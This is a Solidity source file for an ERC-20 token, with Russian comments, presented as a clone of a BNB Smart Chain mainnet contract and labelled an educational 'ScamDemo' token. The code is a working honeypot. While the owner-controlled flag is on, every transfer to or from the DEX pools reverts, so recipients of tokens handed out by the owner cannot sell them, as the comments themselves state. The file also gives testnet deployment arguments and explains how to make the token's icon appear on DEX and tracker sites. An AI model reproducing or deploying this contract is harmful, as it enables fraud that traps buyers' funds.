// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title TokenV3
 * @notice Clone of 0x7FD049EB478b7b216F23299A37bc57EbDf098888 (BSC Mainnet)
 * @dev Upgradeable-compatible: empty constructor + initialize().
 *      Features: ERC-20, EIP-2612 permit, two liquidity pools,
 *      transferConstraints (one-time removal), TransferFlapToken event.
 *      NO mint / burn / blacklist / pause.
 *
 * ─────────────────────────────────────────────────────────────────────────
 *  HOW metaURI WORKS (иконка токена)
 * ─────────────────────────────────────────────────────────────────────────
 *  metaURI — это ссылка на JSON-файл с метаданными токена.
 *  Формат JSON (ERC-1046 / Token Metadata Standard):
 *
 *  {
 *    "name":        "ScamDemo Token",
 *    "symbol":      "SCAM",
 *    "description": "Educational demo token",
 *    "image":       "https://example.com/icon.svg",  ← URL иконки
 *    "decimals":    18
 *  }
 *
 *  Кто читает metaURI:
 *    - DEX-интерфейсы (PancakeSwap, 1inch) — показывают иконку в пуле
 *    - DexScreener, Poocoin — иконка на странице токена
 *    - Некоторые кошельки (Trust Wallet, TokenPocket)
 *    - MetaMask (только если добавлен через Watch Asset с metaURI)
 *
 *  ВАЖНО: MetaMask по умолчанию не вызывает metaURI.
 *  Иконка в MetaMask берётся из Trust Wallet Assets (github репо)
 *  только для верифицированных токенов с большой капитализацией.
 *
 * ─────────────────────────────────────────────────────────────────────────
 *  ПРИМЕР ДЛЯ ДЕПЛОЯ НА TESTNET (BSC Testnet / Amoy):
 * ─────────────────────────────────────────────────────────────────────────
 *  initialize(
 *    "0x0000000000000000000000000000000000000001",  // v2Pool (тест)
 *    "0x0000000000000000000000000000000000000002",  // v3Pool (тест)
 *    "ScamDemo Token",                               // name
 *    "SCAM",                                         // symbol
 *    "https://raw.githubusercontent.com/aliter230880/deploy_all/main/admin-panel/metadata/scamdemo.json",
 *    1000000000                                      // maxSupply (1B, без decimals)
 *  )
 * ─────────────────────────────────────────────────────────────────────────
 */
contract TokenV3 {

    // ─── ERC-20 state ────────────────────────────────────────────────────────
    string  public name;
    string  public symbol;
    uint8   public decimals;
    uint256 public totalSupply;
    uint256 public maxSupply;
    address public owner;

    /**
     * @notice URI метаданных токена (JSON).
     * @dev    Формат: { "name", "symbol", "image": "<url_иконки>", "decimals" }
     *         Читается DEX-интерфейсами и агрегаторами для отображения иконки.
     *         Задаётся один раз в initialize() — изменить нельзя.
     */
    string  public metaURI;

    // Two liquidity pools (PancakeSwap v2 + v3)
    address private _v2Pool;
    address private _v3Pool;

    /**
     * @notice Ограничения переводов.
     * @dev    true  = переводы К/ОТ пулов ЗАБЛОКИРОВАНЫ (нельзя купить/продать на DEX)
     *         false = свободная торговля (после removeTransferConstraints)
     *
     *         ВНИМАНИЕ: логика оригинала 0x7FD049:
     *           - transferConstraints=true  → обычные переводы между юзерами РАЗРЕШЕНЫ
     *           - transferConstraints=true  → покупка/продажа через DEX ЗАПРЕЩЕНА
     *         Это honeypot-механика: купить можно, продать нельзя.
     */
    bool public transferConstraints;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    // ─── EIP-2612 ────────────────────────────────────────────────────────────
    mapping(address => uint256) public nonces;
    bytes32 public DOMAIN_SEPARATOR;
    bytes32 private constant PERMIT_TYPEHASH =
        keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    // ─── Proxy pattern ───────────────────────────────────────────────────────
    bool private _initialized;

    // ─── Events ──────────────────────────────────────────────────────────────
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event EIP712DomainChanged();
    event Initialized(uint8 version);
    // NOTE: none of the args are indexed — matches 0x7FD049 ABI exactly
    // Эмитируется после КАЖДОГО Transfer (включая mint) — для удобства индексаторов
    event TransferFlapToken(address from, address to, uint256 value);

    // ─── Modifiers ───────────────────────────────────────────────────────────
    modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: caller is not the owner");
        _;
    }

    // ─── Constructor (empty — EIP-1167 proxy compatible) ──────────────────────
    constructor() {}

    // ─── Initialize ───────────────────────────────────────────────────────────
    /**
     * @notice Инициализация токена. Вызывается один раз после деплоя.
     * @param _v2PoolAddr  Адрес пула PancakeSwap V2
     * @param _v3PoolAddr  Адрес пула PancakeSwap V3
     * @param name_        Название токена (напр. "ScamDemo Token")
     * @param symbol_      Тикер (напр. "SCAM")
     * @param meta_        URI метаданных — JSON с иконкой.
     *                     Пример: "https://raw.githubusercontent.com/.../scamdemo.json"
     *                     JSON формат: { "name": "...", "symbol": "...", "image": "https://...", "decimals": 18 }
     * @param maxSupply_   Максимальная эмиссия БЕЗ decimals (напр. 1000000000 = 1 миллиард)
     *                     Контракт умножает на 10^18 автоматически
     */
    function initialize(
        address _v2PoolAddr,
        address _v3PoolAddr,
        string memory name_,
        string memory symbol_,
        string memory meta_,
        uint256 maxSupply_
    ) public {
        require(!_initialized, "Initializable: contract is already initialized");
        _initialized = true;

        name     = name_;
        symbol   = symbol_;
        decimals = 18;
        metaURI  = meta_;

        uint256 scaledMax = maxSupply_ * (10 ** 18);
        maxSupply   = scaledMax;
        totalSupply = scaledMax;

        _v2Pool = _v2PoolAddr;
        _v3Pool = _v3PoolAddr;

        // Ограничения активны при запуске:
        // переводы К/ОТ пулов заблокированы до removeTransferConstraints()
        transferConstraints = true;

        owner = msg.sender;
        _balances[msg.sender] = scaledMax;

        DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes(name_)),
                keccak256(bytes("1")),
                block.chainid,
                address(this)
            )
        );

        emit Initialized(1);
        emit OwnershipTransferred(address(0), msg.sender);
        emit Transfer(address(0), msg.sender, scaledMax);
        emit TransferFlapToken(address(0), msg.sender, scaledMax);
    }

    // ─── ERC-20 ──────────────────────────────────────────────────────────────
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 allowed = _allowances[from][msg.sender];
        require(allowed >= amount, "ERC20: insufficient allowance");
        if (allowed != type(uint256).max) {
            _allowances[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _allowances[msg.sender][spender] += addedValue;
        emit Approval(msg.sender, spender, _allowances[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(_allowances[msg.sender][spender] >= subtractedValue, "ERC20: decreased allowance below zero");
        _allowances[msg.sender][spender] -= subtractedValue;
        emit Approval(msg.sender, spender, _allowances[msg.sender][spender]);
        return true;
    }

    // ─── Pools ───────────────────────────────────────────────────────────────
    /// @notice Возвращает адреса обоих пулов: (v2Pool, v3Pool)
    function pools() public view returns (address, address) {
        return (_v2Pool, _v3Pool);
    }

    // ─── Transfer constraints ────────────────────────────────────────────────
    /**
     * @notice Снять ограничения на торговлю через пулы.
     * @dev    После вызова: переводы к/от пулов разрешены (открытая торговля на DEX).
     *         Только owner. Необратимо — обратно включить нельзя.
     *         Вызывать ПОСЛЕ добавления ликвидности в DEX.
     */
    function removeTransferConstraints() public onlyOwner {
        require(transferConstraints, "Constraints already removed");
        transferConstraints = false;
    }

    // ─── Ownership ───────────────────────────────────────────────────────────
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    // ─── EIP-2612 Permit ─────────────────────────────────────────────────────
    function permit(
        address _owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        require(deadline >= block.timestamp, "ERC20Permit: expired deadline");
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                DOMAIN_SEPARATOR,
                keccak256(abi.encode(PERMIT_TYPEHASH, _owner, spender, value, nonces[_owner]++, deadline))
            )
        );
        address signer = ecrecover(digest, v, r, s);
        require(signer == _owner && signer != address(0), "ERC20Permit: invalid signature");
        _allowances[_owner][spender] = value;
        emit Approval(_owner, spender, value);
    }

    function eip712Domain()
        public
        view
        returns (
            bytes1 fields,
            string memory _name,
            string memory version,
            uint256 chainId,
            address verifyingContract,
            bytes32 salt,
            uint256[] memory extensions
        )
    {
        return (hex"0f", name, "1", block.chainid, address(this), bytes32(0), new uint256[](0));
    }

    // ─── Internal transfer ───────────────────────────────────────────────────
    /**
     * @dev Логика transferConstraints (точно как в оригинале 0x7FD049):
     *
     *   transferConstraints = true (при запуске):
     *     - перевод К v2Pool   → REVERT "Token: transfer to/from uniswap v2 pool is not allowed"
     *     - перевод ОТ v2Pool  → REVERT
     *     - перевод К v3Pool   → REVERT
     *     - перевод ОТ v3Pool  → REVERT
     *     - все остальные переводы (user→user, owner→user) → РАЗРЕШЕНО
     *
     *   transferConstraints = false (после removeTransferConstraints):
     *     - все переводы разрешены
     *
     *   HONEYPOT-эффект при constraints=true:
     *     Купить через DEX = перевод ОТ пула → ЗАБЛОКИРОВАНО
     *     НО: owner может раздавать токены напрямую (transfer)
     *     Жертвы получают токены, но продать через DEX не могут.
     */
    function _transfer(address from, address to, uint256 amount) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amount, "ERC20: transfer amount exceeds balance");

        if (transferConstraints) {
            if (from == _v2Pool || to == _v2Pool) {
                revert("Token: transfer to/from uniswap v2 pool is not allowed");
            }
            if (from == _v3Pool || to == _v3Pool) {
                revert("Token: transfer to/from uniswap v3 pool is not allowed");
            }
        }

        _balances[from] -= amount;
        _balances[to]   += amount;

        emit Transfer(from, to, amount);
        // Эмитируется после КАЖДОГО перевода (как в оригинале 0x7FD049)
        emit TransferFlapToken(from, to, amount);
    }
}
